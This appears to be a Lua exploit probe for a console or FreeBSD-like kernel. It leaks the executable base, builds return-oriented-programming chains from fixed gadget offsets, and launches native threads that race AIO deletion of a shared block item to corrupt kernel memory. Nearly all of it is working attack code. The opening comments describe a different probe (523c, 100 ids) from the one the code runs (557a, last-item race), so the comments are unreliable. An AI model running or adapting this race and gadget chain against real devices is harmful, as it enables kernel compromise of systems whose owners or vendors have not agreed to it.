-- CRASH_CLASS: HIGH
-- PROBE 523c: AIO delete race on native threads (fixed stack layout)
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- This probe first proves the layout with ONE child deleting 20 ids, then
-- launches TWO children that each delete the same 100 ids. If the delete's
-- post-unlock re-lookup loses the race, two children report status 0 for the
-- same id. Overlaps are printed as they are observed, so a crash after a hit
-- still leaves the evidence.

print("=== PROBE 557a: BLOCK-MODE LAST-ITEM RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end


-- Block mode: one entry with count=4, all items sharing one 0x30 context.
local COUNT = 4
local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(COUNT * 0x28 + 0x100)
local out_id = memory.alloc(0x200)
local poll_out = memory.alloc(0x40)
for i = 0, COUNT * 0x28 - 4, 4 do wd(N(data) + i, 0) end
for i = 0, 0x1FC, 4 do wd(N(out_id) + i, 0) end

print(string.format("[A] creating block group count=%d", COUNT))
local rv = N(sc_create(uint64(0x1001), uint64(N(data)), uint64(COUNT), uint64(1), uint64(N(out_id))))
local base = rd(N(out_id)) or 0
print(string.format("    create ret=%d base=%08X", rv, base))
if rv ~= 0 then print("create failed"); return end

local ids = memory.alloc(COUNT * 4 + 16)
for i = 0, COUNT - 1 do wd(N(ids) + i * 4, base + i * 0x10000) end
for i = 0, COUNT - 1 do
    local cell = memory.alloc(8)
    wd(N(cell), rd(N(ids) + i * 4))
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    print(string.format("    item %d id=%08X poll=%08X", i, rd(N(ids) + i * 4), rd(N(poll_out)) or 0))
end

-- delete items 0..COUNT-2 serially: the entry count walks down without freeing C
for i = 0, COUNT - 2 do
    local cell = memory.alloc(8)
    local out = memory.alloc(8)
    wd(N(cell), rd(N(ids) + i * 4))
    wd(N(out), 0xCCCCCCCC)
    local ok, r = pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(out))) end)
    print(string.format("[B] serial delete %d ret=%s status=%s", i, tostring(N(r)), fmt(rd(N(out)))))
end

-- the last item is the only one whose delete frees the shared context
local last = memory.alloc(8)
wd(N(last), rd(N(ids) + (COUNT - 1) * 4))

local function build_one(tag)
    local status = memory.alloc(64)
    for i = 0, 0x3C, 4 do wd(N(status) + i, 0xCCCCCCCC) end
    local CHAIN_MAX = 0x4000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit_sysarch_preamble(emit)
    emit(g_pop_rdi); emit(uint64(N(last)))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(N(status)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, status
end

local p1, s1 = build_one("a")
local p2, s2 = build_one("b")
print("[C] launching two children onto the last item")
local ok1, r1 = pcall(function() return sc_thr_new(p1, uint64(0x38)) end)
local ok2, r2 = pcall(function() return sc_thr_new(p2, uint64(0x38)) end)
print(string.format("    thr_new %s/%s", tostring(ok1), tostring(ok2)))
local spins = 0
while spins < 200000 do
    if rd(N(s1)) ~= -858993460 and rd(N(s2)) ~= -858993460 then break end
    spins = spins + 1
end
print(string.format("[D] statuses %s / %s alive=%s", fmt(rd(N(s1))), fmt(rd(N(s2))), tostring(alive())))
if not alive() then return end

print("[E] follow-up creates through the possibly damaged free list")
for k = 1, 4 do
    for i = 0, 0x1FC, 4 do wd(N(out_id) + i, 0) end
    local r = N(sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id))))
    local id = rd(N(out_id)) or 0
    local cell = memory.alloc(8)
    local out = memory.alloc(8)
    wd(N(cell), id)
    wd(N(out), 0xCCCCCCCC)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    local ok, dr = pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(out))) end)
    print(string.format("    create=%d id=%08X poll=%08X delete=%s alive=%s",
        r, id, rd(N(poll_out)) or 0, fmt(rd(N(out))), tostring(alive())))
    if not alive() then break end
end
print("=== DONE ===")
